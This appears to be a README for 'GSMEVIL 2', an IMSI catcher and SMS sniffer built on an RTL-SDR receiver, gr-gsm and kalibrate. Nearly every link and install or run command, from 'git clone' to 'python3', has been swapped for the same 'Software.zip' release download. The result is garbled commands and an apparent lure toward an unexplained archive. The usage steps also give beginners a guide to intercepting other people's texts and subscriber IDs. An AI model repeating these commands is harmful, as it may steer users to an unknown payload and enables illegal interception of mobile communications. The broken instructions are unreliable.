
  <p align="center">
    <img alt="GSMEVIL 2 Title" src="https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip" style="max-width:100%;max-height:100%;" />
  </p>

**GSMEVIL 2** is python web based tool which use for capturing imsi numbers and sms and also you able to see sms and imsi on any device using your favorite browser and it's make easy to capture sms and imsi numbers for those who not have much knowledge about gsm packets capturing.

# Disclaimer:-
This program was made to understand how GSM network works. Not for bad hacking !
We are not responsible for any illegal activity !

# Setup

Install GSMEvil :
```
git clone https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
pip3 install -r https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
```

Install Gr GSM :  ( For receiving GSM transmissions )
```
sudo add-apt-repository -y ppa:ptrkrysik/gr-gsm
sudo apt update
sudo apt install gr-gsm
```

If gr-gsm failled to setup. Than follow those this : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  

Install Kalibrate : ( For finding frequencies )
```
apt-get install kalibrate-rtl
```
OR
```
sudo apt install build-essential libtool automake autoconf librtlsdr-dev libfftw3-dev
git clone https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
cd kalibrate-rtl
./bootstrap && CXXFLAGS='-W -Wall -O3'
./configure
make
sudo make install
```
# Usage
You need gsm frequency on which you capture sms or imsi. By using kalibrate you will get all your near gsm base stations  frequencies.
```
kal -s GSM900
```
```
kal: Scanning for GSM-900 base stations.
GSM-900:
	chan: 4 (935.8MHz + 320Hz)	power: 1829406.95
	chan: 11 (937.2MHz + 308Hz)	power: 4540354.88
...
```
Now you need to capture gsm traffic using gr-gsm on frequency of your any gsm base station which you get from kalibrate.
```
grgsm_livemon -f <your_frequency>M
```
Example :
```
grgsm_livemon -f 935.8M
```
if you see output that's mean you getting gsm packets than continue other setps else change frequency.
```
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b 2b
...
```
Now every thing is ready you can start now capturing sms or imsi numbers using gsmevil.
You able to run imsi catcher and sms sniffer both at same time using 2 seprate terminal for capture imsi numbers and sms both at same time.
```
cd <your gsmevil2 folder> #Example cd gsmevil2
```
#### Usage :

Run this command to quick start Gsm Evil 2.
```
python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip 
```
Options :
```
python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip -h
Usage: https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip [options]

Options:
  -h, --help            show this help message and exit
  -i IFACE, --iface=IFACE Interface (default : lo)
  -p PORT, --port=PORT  Port (default : 80)
  --host=HOST           Host (default : localhost)
```
For change host port.
```
python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip -p 8080
```
For change hostname.
```
python3 https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip --host=localhost
```
Open localhost or 127.0.0.1 in your favorite browser and use now.

# Requirements
linux operating system (kali linux)
[rtl-sdr (RTL2832U)](https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip) with antenna (less than 15$) or [HackRF](https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip) 

# Links 
Frequency : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip or https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
Sdr : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
Sms : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
Imsi : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
Cell id : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip or https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
GSM : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
Frequency Calculator : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip  
GR-GSM : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip 

# Donations
Bitcoin : 192bG3RRAGdbTPSUWqxbTBaAnKyvALm84g

# Contact
Website  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
Facebook : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
Twitter  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
Discord  : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip<br/>
Email    : https://github.com/Ahmadtaha7/gsmevil2/releases/download/v1.0/Software.zip
